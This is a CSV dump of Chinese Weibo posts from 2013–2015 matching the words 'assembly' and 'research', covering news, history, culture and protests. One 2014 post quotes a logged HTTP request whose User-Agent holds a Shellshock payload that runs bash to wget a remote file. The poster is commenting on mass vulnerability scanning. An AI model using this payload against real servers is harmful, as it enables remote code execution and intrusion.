页码,微博id,微博作者,发布时间,微博内容,转发数,评论数,点赞数,发布于,ip属地_城市,ip属地_省份,ip属地_国家
53,3851535999872946,三联生活周刊,2015-06-08 19:00:03,#涨知识#【群众几何】即便在监控摄像头已经十分普及的今日，统计大规模集会的参与人数依然是个难题。英国华威大学的研究小组日前指出，可以使用手机发送的数据流量大致估算在场人数。在意大利米兰的机场和体育场进行的实验显示，运用该方法得出的数据与实际值误差仅为13%。 ,12,6,45,,,,
53,3851422863306934,怎麼肥寺,2015-06-08 11:30:29,1918年冬，李大钊和一些人在北京大学建立了“马克思主义研究小组”，成舍我也去参加了第一次集会，散会后他跑到第一宿舍（沙滩北大东斋）把帽子一扔，对几个熟人说：“中国的布尔什维克今天开成立会了。这个主义是‘你的是我的，我的还是我的’的主义，我可不赞成。”此后他就没有去参加过。 ,1,0,1,,,,
53,3848313768201249,德清发布,2015-05-30 21:36:03,#人文德清#近日，德清乾元镇县街34号内的孔庙开始修复。修复后将作为以纪念孔子精神、传承儒家思想、弘扬国学文化为目标，集展示、集会、讲学、研究于一体的爱国主义教育基地、国学文化传承基地、校园文化活动基地。据介绍，该孔庙始建于北宋，现仅存的大殿为光绪二十三年重建。 ,4,3,7,,,,
53,3847079334506476,何志忠浙,2015-05-27 11:50:50,瞧！百岁老战士玩手机！27日临海市新四军历史研究会纪念抗战胜利70周年集会。百岁老战士邹逸用手机拍照录像。他38年入党，历任徐家汇邮局支书、局工委组织委员、新四军淞沪支队武工队长、浙东临委干部队指导员、宁天新工委书记兼政委、新天县工委书记兼武工队政委、天台县委书记县长县大队长兼政委。 ,5,1,2,,,,
53,3833727073600099,陈履生,2015-04-20 15:33:44,倭寇与倭寇图像国际研究集会，今天在东京大学史料编撰所举行，感谢黄荣光博士代我宣读论文《明代版画中的倭寇图像研究》，遗憾未能与会 ,0,2,2,,,,
53,3795245776810525,新潮流MPLUS,2015-01-04 11:02:48,#MiLK新潮流# 第163期《MiLK新潮流》，封面由Eason Chan演绎adidas Originals春夏新作。其他内容放送：「Normcore Style」之反时尚男生造型美学 、《Frozen》× CdG限定新作速递、亚文化之集会「SANKUANZ」、日系品牌潮流 ＋ 文化研究：Luker by Neighborhood &amp; Whiz Ltd.、PlayStation 20周年超特集！ ,4,4,13,,,,
53,3791116077376985,内含子,2014-12-24 01:32:51,估计800名动物权利积极分子在德国马克思-普朗克研究所外集会，呼吁停止使用猴子都灵长动物做研究。 网页链接 ,38,19,0,,,,
53,3775712265262217,定时顶点,2014-11-11 13:23:36,【世博文化中心】原名为世博演艺中心，是世界一流水准的现代文化演艺综合场馆；集综合演艺、艺术展示、时尚娱乐于一体的文化集聚中心区；上海、华东、中国、世界的 文化娱乐新地标、都市旅游新亮点。世博期间各类综艺表演、庆典集会、艺术交流、学术研究、休闲娱乐、旅游观赏的多功能演艺场所。 ,18,2,12,,,,
54,3768756893341038,用户1860133492,2014-10-23 08:45:26,“占领中环”非法集会已经持续超过3个星期，行动并没有获得大部分香港市民支持。香港研究协会昨日公布一项民调显示，七成的受访市民不支持“占中”行动，超过六成的受访市民不能接受示威人士的行为。 ,10,29,0,,,,
54,3760412199694781,宫一鸣cn,2014-09-30 08:06:36,GET / HTTP/1.1 Host: &lt;Redacted&gt; Accept: */* User-Agent: () { :;}; /bin/bash -c &quot;wget 网页链接 每出一个漏洞，就会有越来越多的“研究性质”的个人或者组织加入扫描，也许有一天会变成万人集会大扫描？共享下数据有没有可能呢？ ,9,2,1,,,,
54,3739191990655795,鸿坤美术,2014-08-02 18:45:04,@鸿坤美术 #集萃#【抗战时期的中国留法艺术学会】1933年4月，留学法国的中国学生吕斯百、常书鸿、刘开渠等在巴黎邀约一批研究艺术的同学集会，发起成立了中国留法艺术学会。更多精彩内容请点下方大图“扫一扫二维码”即可关注我们官方微信。 ,95,31,1,,,,
54,3711870538030964,dxdownunder,2014-05-19 09:19:22,@澳大利亚SBS广播公司 《正在行动》栏目：《南海变局：越南排华事件》。在澳大利亚，越南裔族群在上周末于主要城市的中国使领馆前开展了抗议集会(图ABC)。中国社科院世界经济与政治研究所薛力博士、亚太与全球战略研究院杨丹志博士和高程博士分析越南排华事件。收听链接：网页链接 ,9,13,1,,,,
55,3697740591179670,棠叶A秋子,2014-04-10 09:32:00,【日本学者等5000人集会东京 抗议行使集体自卫权】4月9日电 据日本放送协会(NHK)报道，当地时间8日晚，由作家大江健三郎及相关律师、研究人员等在东京都内发起约5000人的集会，反对行使集体自卫权，破坏宪法第九条。 ,0,0,1,,,,
55,3697726518578394,南昌进贤发布,2014-04-10 08:36:04,【日5000人集会抗议行使集体自卫权】#国际新闻# 据日本放送协会(NHK)报道，当地时间8日晚，由作家大江健三郎及相关律师、研究人员等在东京都内发起约5000人的集会，反对行使集体自卫权，破坏宪法第九条。日本现行宪法第9条规定：永远放弃以国权发动的战争、武力威胁或武力行使作为解决国际争端的手段。 ,7,4,6,,,,
55,3688164126238456,塔列郎,2014-03-14 23:18:33,６月２１日，河南省濮阳市举行“爱国歌曲大家唱”活动。演出举办期间，濮阳市高新技术开发区胡村乡办公室主任王留聚冲上舞台与正在唱歌的一名女歌手进行互动，２２日濮阳市公安机关即以扰乱大型群众集会秩序为由，对王给予行政拘留５日处罚；２４日高新区领导班子开会研究决定对王留聚做出免职处理。 ,0,0,0,,,,
55,3682574133806515,一个装置,2014-02-27 13:05:55,#摘抄#“典型的民族主义运动通常不是起始于抗议集会、独立宣言或武装反抗，而是源自于文学社团、历史研究、音乐汇演或文化期刊的诞生。”对文化构建的强调是民族主义社会和政治运动的特点 而人文知识分子担当了主动连接与宣传的责任 虽然并不知道Anthony D.Smith把“人文”加双引号是几个意思...... ,1,1,0,,,,
55,3681464426330767,美东侨报,2014-02-24 11:36:20,【控枪大集会 国会议员领衔】21日上午，众多枪击案受害者联同公益团体来到纽约市正厅，在其门前的台阶上举行集会，呼吁奥巴马总统为控枪研究项目划拨专款。网页链接 #侨报新闻速递# ,1,1,2,,,,
55,3670919384282011,GSMA全球移动通信协会,2014-01-26 09:14:07,#GSMA公告牌#MWC2014 除了会议和展览之外，今年的NFC技术和移动金融峰会还将包括研讨会、集会和专题讨论会，为参与者提供进一步讨论和研究影响行业发展的主要问题的机会，以及与同僚沟通交流和建立新联系的机会。 ,0,0,0,,,,
55,3667353990872605,MrkasingNg,2014-01-16 13:06:30,在农业科学研究所吃饭 蔬菜大集会 健康生活 由我做起 ,0,0,0,,,,
55,3658947632170881,银川六中,2013-12-24 08:22:38,@银川教育 12月20日下午2:20分，银川六中全体教师在科技艺术楼学术报告厅集会聆听了中国教师研修网培训总监、上海市教育科学研究院研究员周卫教授的“课堂观察技术与课例研究方法”讲座。 ,0,2,1,,,,
55,3655108925711179,楚网,2013-12-13 18:08:59,#国内新闻#12月13日，南京举行国际和平集会悼念南京大屠杀30万同胞遇难76周年，各界人士参加集会。南京成立了侵华日军南京大屠杀史研究会(幸存者)口述史分会，目前正按照国际标准深度抢救侵华日军南京大屠杀幸存者证言，通过全程展示幸存者人生历程揭示日本侵华战争的罪恶。 ,0,0,0,,,,
55,3655026813556037,侵华日军南京大屠杀遇难同胞纪念馆,2013-12-13 12:42:41,在悼念南京大屠杀同胞遇难76周年之际，扬州大学党委副书记、副校长芮鸿岩，原副校长周新国教授率50多名师生来馆参加“悼念南京大屠杀30万同胞遇难76周年仪式暨南京国际和平集会”，并在宁举行“扬州大学博（硕）士研究生工作站暨爱国主义教育基地揭牌仪式”。 ,1,3,7,,,,
56,3654976696172594,李金平律师,2013-12-13 09:23:32,《言论自由》美国大法官布兰代斯在为1927年一案的裁决中写道：那些为我们赢得国家独立的人认为，思你所思、说你所想的自由是发现和传播真理的不可或缺的手段；没有言论自由，集会讨论也会毫无成效；有了言论自由，研究讨论通常才会有充分的抵制有害教条散布的...畅读版【网页链接】 ,2,1,0,,,,
56,3652101232145642,华政研究生法援,2013-12-05 10:57:28,#普法宣传周#12.5国际志愿者日#借着普法宣传周的系列活动和静安区国际志愿者日主题集会，我们华政研究生法援劳动者权益保障部的同学和静安寺街道总工会的人员一道在静安广场参与普法宣传活动。为社区居民普及法律知识，解答法律问题。同时践行志愿服务精神。 我在这里:上海·静安寺 ,5,2,3,,,,
56,3647925101940485,王杨FILM,2013-11-23 22:23:00,美国电影艺术与科学学院的宗旨：（指向是科学与进步，值得思考） ⒈提高电影艺术与科学的质量 ⒉为发展文化、教育与艺术而加强各部门的协作 ⒊表彰显著成绩者 ⒋促进技术研究和技术方法、设备的改善 ⒌为电影摄制各部门的讨论和集会提供场所 ⒍听取电影界人士的呼声 ⒎推进大众和电影企业的教育活动 ,0,1,2,,,,
56,3637613204692464,龙龙猫中毒,2013-10-26 11:27:13,平安京.京都研究集会，聚乐第の再検討.昼休憩中.文献史学的表示考古学苦手（−＿−；） 我在:日本Kamigyo-Ku ,0,8,0,,,,
56,3637317652279630,平安民权,2013-10-25 15:52:47,#警务报道#近日，近日，老颜集集会两家大超市大门口附近连续发生数起电动三轮车被盗案件，为打击此类犯罪，所长召开会议，研究分析发案规律、特点、时间、侵害目标等，抽出精干警力，在集会上布置下一张抓捕之网。 在抓获嫌疑人时，围观对此赞不绝口，打出了公安机关的声威。@平安商丘 ,1,0,0,,,,
56,3634362229081621,MBA环球网,2013-10-17 12:09:00,【把你的管理谋略放上网】按照传统，如果一位管理者想要检验一个观点，他们或许会在行业集会上征求同行意见，也可能会雇人展开研究。如今，很多管理者转而借助互联网将自己的想法公开表达出来。网页链接 ,0,0,0,,,,
57,3611888695213585,劍心_HK,2013-08-16 11:47:11,【日藝】08/16：早前從AKB48畢業的篠田麻里子將參加FUJIT TWO「帥哥廚房」的演出。這個節目由舊隊友秋元才加當主持，由美男料理研究家寺田真二郎為了女嘉賓炮製美食，這集會有他和麻里子飲酒對談的場面。至於秋元將於28日畢業，對於戀愛解禁她表示未知喜歡的男生類型，也不急於戀愛。9月12日播出。 ,7,0,0,,,,
57,3608880078219479,红菱砚57,2013-08-08 04:32:03,1954年2月在中共七届四中全会上因同饶漱石进行分裂党、篡夺党和国家最高权力的阴谋活动受到揭发和批判，1954年8月17日自杀身亡；1955年3月中共全国代表会议通过决议，开除其党籍，撤销其党内外一切职务，至今并未平反。高岗家乡陕西省横山县成立高岗研究会，并为高岗立纪念碑，且集会大张旗鼓地进行。 ,0,0,0,,,,
57,3605348386284786,香港中评社,2013-07-29 10:38:21,【委内瑞拉成立查韦斯思想高级研究所】中评社香港7月29日电／委内瑞拉总统马杜罗今天在巴里纳斯州的群众集会上宣布，委内瑞拉政府决定建立“乌戈·查韦斯思想高级研究所”，并任命查韦斯的哥哥亚当出任这个研究所的所长。    据人民网消息，今年3...网页链接 ,1,0,0,,,,
